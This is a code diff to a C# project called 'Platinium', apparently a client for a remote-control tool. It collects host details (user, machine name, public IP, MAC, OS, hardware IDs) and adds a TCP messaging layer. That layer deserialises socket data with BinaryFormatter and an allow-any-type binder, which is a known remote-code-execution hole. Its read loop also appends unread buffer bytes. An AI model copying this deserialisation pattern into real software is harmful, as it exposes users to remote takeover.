@@ -26,6 +26,7 @@ using System.Net.NetworkInformation;
 using System.DirectoryServices.AccountManagement;
 using System.Globalization;
 using Platinium.Connection;
+using Platinium.Shared.Data.Serialization;
 
 namespace Platinium
 {
@@ -109,7 +110,6 @@ namespace Platinium
                     return s;
                 }
                 #region Original Device ID Getting Code
-                //Return a hardware identifier
                 private static string identifier
                 (string wmiClass, string wmiProperty, string wmiMustBeTrue)
                 {
@@ -121,7 +121,6 @@ namespace Platinium
                     {
                         if (mo[wmiMustBeTrue].ToString() == "True")
                         {
-                            //Only get the first one
                             if (result == "")
                             {
                                 try
@@ -137,7 +136,6 @@ namespace Platinium
                     }
                     return result;
                 }
-                //Return a hardware identifier
                 private static string identifier(string wmiClass, string wmiProperty)
                 {
                     string result = "";
@@ -163,26 +161,22 @@ namespace Platinium
                 }
                 private static string cpuId()
                 {
-                    //Uses first CPU identifier available in order of preference
-                    //Don't get all identifiers, as it is very time consuming
                     string retVal = identifier("Win32_Processor", "UniqueId");
-                    if (retVal == "") //If no UniqueID, use ProcessorID
+                    if (retVal == "")
                     {
                         retVal = identifier("Win32_Processor", "ProcessorId");
-                        if (retVal == "") //If no ProcessorId, use Name
+                        if (retVal == "")
                         {
                             retVal = identifier("Win32_Processor", "Name");
-                            if (retVal == "") //If no Name, use Manufacturer
+                            if (retVal == "")
                             {
                                 retVal = identifier("Win32_Processor", "Manufacturer");
                             }
-                            //Add clock speed for extra security
                             retVal += identifier("Win32_Processor", "MaxClockSpeed");
                         }
                     }
                     return retVal;
                 }
-                //BIOS Identifier
                 private static string biosId()
                 {
                     return identifier("Win32_BIOS", "Manufacturer")
@@ -192,7 +186,6 @@ namespace Platinium
                     + identifier("Win32_BIOS", "ReleaseDate")
                     + identifier("Win32_BIOS", "Version");
                 }
-                //Main physical hard drive ID
                 private static string diskId()
                 {
                     return identifier("Win32_DiskDrive", "Model")
@@ -200,7 +193,6 @@ namespace Platinium
                     + identifier("Win32_DiskDrive", "Signature")
                     + identifier("Win32_DiskDrive", "TotalHeads");
                 }
-                //Motherboard ID
                 private static string baseId()
                 {
                     return identifier("Win32_BaseBoard", "Model")
@@ -208,13 +200,11 @@ namespace Platinium
                     + identifier("Win32_BaseBoard", "Name")
                     + identifier("Win32_BaseBoard", "SerialNumber");
                 }
-                //Primary video controller ID
                 private static string videoId()
                 {
                     return identifier("Win32_VideoController", "DriverVersion")
                     + identifier("Win32_VideoController", "Name");
                 }
-                //First enabled network card ID
                 private static string macId()
                 {
                     return identifier("Win32_NetworkAdapterConfiguration",
@@ -226,42 +216,89 @@ namespace Platinium
             {
                 public static bool IsAdministrator()
                 {
-                    WindowsIdentity identity = WindowsIdentity.GetCurrent();
-                    WindowsPrincipal principal = new WindowsPrincipal(identity);
-                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
+                    bool ret;
+                    try
+                    {
+                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
+                        WindowsPrincipal principal = new WindowsPrincipal(identity);
+                        ret = principal.IsInRole(WindowsBuiltInRole.Administrator);
+                    }
+                    catch (Exception) { ret = false; }
+                    return ret;
                 }
                 public static string GetPublicIP()
                 {
-                    return new WebClient().DownloadString(@"http://icanhazip.com").Trim();
+                    string ret;
+                    WebClient wc = new WebClient();
+                    try
+                    {
+                        ret = wc.DownloadString(@"http://icanhazip.com").Trim();
+                    }
+                    catch (Exception) { ret = "0.0.0.0"; }
+                    return ret;
                 }
                 public static string GetMacAddress()
                 {
-                    return (from nic in NetworkInterface.GetAllNetworkInterfaces()
-                            where nic.OperationalStatus == OperationalStatus.Up
-                            select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
+                    string ret;
+                    try
+                    {
+                        ret = (from nic in NetworkInterface.GetAllNetworkInterfaces()
+                               where nic.OperationalStatus == OperationalStatus.Up
+                               select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
+                    }
+                    catch (Exception) { ret = "0"; }
+                    return ret;
                 }
                 public static string GetCurrentLoggedUser()
                 {
-                    string ret = WindowsIdentity.GetCurrent().Name;
+                    string ret;
+                    try
+                    {
+                        ret = WindowsIdentity.GetCurrent().Name;
+                    }
+                    catch (Exception) { ret = "0"; }
                     return ret;
                 }
                 public static string GetComputerName()
                 {
-                    return Dns.GetHostName();
+                    string ret;
+                    try
+                    {
+                        ret = Dns.GetHostName();
+                    }
+                    catch (Exception) { ret = "0"; }
+                    return ret;
                 }
                 public static string GetCurrentCulture()
                 {
-                    return CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
+                    string ret;
+                    try
+                    {
+                        ret = CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
+                    }
+                    catch (Exception) { ret = "0"; }
+                    return ret;
                 }
                 public static string GetAppNetVersion()
                 {
-                    return Assembly.GetExecutingAssembly().GetReferencedAssemblies().Where(x => x.Name == "System.Core").First().Version.ToString();
+                    string ret;
+                    try
+                    {
+                        ret = Assembly.GetExecutingAssembly().GetReferencedAssemblies().Where(x => x.Name == "System.Core").First().Version.ToString();
+                    }
+                    catch (Exception) { ret = "0"; }
+                    return ret;
                 }
                 public static string GetOSName()
                 {
-                    var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
-                                select x.GetPropertyValue("Caption")).FirstOrDefault();
-                    return name != null ? name.ToString() : "Unknown";
+                    string ret;
+                    try
+                    {
+                        ret = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
+                               select x.GetPropertyValue("Caption")).FirstOrDefault().ToString();
+                    }
+                    catch (Exception) { ret = "0"; }
+                    return ret != null ? ret.ToString() : "Unknown";
                 }
             }
         }
@@ -377,6 +414,37 @@ namespace Platinium
         }
         namespace Data
         {
+            namespace Network
+            {
+                public class NetworkManagement
+                {
+                    public static Package ReadData(TcpClient Socket)
+                    {
+                        NetworkStream networkStream = Socket.GetStream();
+                        List<byte> data = new List<byte>();
+                        if (networkStream.CanRead)
+                        {
+                            byte[] buffer = new byte[1024];
+                            int totalBytesRead = 0;
+                            do
+                            {
+                                totalBytesRead = networkStream.Read(buffer, 0, buffer.Length);
+                                data.AddRange(buffer);
+                            } while (networkStream.DataAvailable);
+                        }
+                        return (Package)Serializer.Deserialize(data.ToArray());
+                    }
+                    public static void WriteData(TcpClient Socket, Package Package)
+                    {
+                        byte[] data = Serializer.Serialize(Package);
+                        NetworkStream networkStream = Socket.GetStream();
+                        if (networkStream.CanWrite)
+                        {
+                            networkStream.Write(data, 0, data.Length);
+                        }
+                    }
+                }
+            }
             namespace Packages
             {
                 public class PackageFactory
@@ -410,8 +478,6 @@ namespace Platinium
                             case PackageType.NoResponse:
                                 break;
                             case PackageType.Response:
-                                break;
-                            default:
                                 break;
                         }
                         return returnPackage;
@@ -472,8 +538,6 @@ namespace Platinium
                             case PackageType.NoResponse:
                                 break;
                             case PackageType.Response:
-                                break;
-                            default:
                                 break;
                         }
                         return returnPackage;
@@ -541,8 +605,6 @@ namespace Platinium
                                 break;
                             case PackageType.Response:
                                 break;
-                            default:
-                                break;
                         }
                         return returnPackage;
                     }
@@ -571,19 +633,6 @@ namespace Platinium
                         PackageType = packagetype;
                     }
                 }
-                [Serializable]
-                public class TransportPackage
-                {
-                    public byte[] Data = new byte[1048576];
-                    public TransportPackage()
-                    {
-
-                    }
-                    public TransportPackage(byte[] data)
-                    {
-                        Data = data;
-                    }
-                }
             }
             namespace Serialization
             {
@@ -592,55 +641,31 @@ namespace Platinium
                     public override Type BindToType(string assemblyName, string typeName)
                     {
                         Type typeToDeserialize = null;
-
-                        String currentAssembly = Assembly.GetExecutingAssembly().FullName;
-
-                        // In this case we are always using the current assembly
+                        string currentAssembly = Assembly.GetExecutingAssembly().FullName;
                         assemblyName = currentAssembly;
-
-                        // Get the type using the typeName and assemblyName
-                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
-                            typeName, assemblyName));
-
+                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}", typeName, assemblyName));
                         return typeToDeserialize;
                     }
                 }
                 public class Serializer
                 {
-                    public static TransportPackage Serialize(object objToSerialize)
+                    public static byte[] Serialize(object objToSerialize)
                     {
                         using (var memoryStream = new MemoryStream())
                         {
                             BinaryFormatter bf = new BinaryFormatter();
                             bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                             (bf).Serialize(memoryStream, objToSerialize);
-                            return new TransportPackage(memoryStream.ToArray());
-                        }
-                    }
-                    public static object Deserialize(TransportPackage package)
-                    {
-                        using (var memoryStream = new MemoryStream(package.Data))
-                        {
-                            BinaryFormatter bf = new BinaryFormatter();
-                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
-                            memoryStream.Seek(0, SeekOrigin.Begin);
-                            return (bf).Deserialize(memoryStream);
-                        }
-                    }
-                    public static byte[] SerializeToByte(object objToSerialize)
-                    {
-                        using (var memoryStream = new MemoryStream())
-                        {
-                            (new BinaryFormatter()).Serialize(memoryStream, objToSerialize);
                             return memoryStream.ToArray();
                         }
                     }
-                    public static object DeserializeFromByte(byte[] data)
+                    public static object Deserialize(byte[] data)
                     {
                         using (var memoryStream = new MemoryStream(data))
                         {
                             BinaryFormatter bf = new BinaryFormatter();
                             bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
+                            memoryStream.Seek(0, SeekOrigin.Begin);
                             return (bf).Deserialize(memoryStream);
                         }
                     }
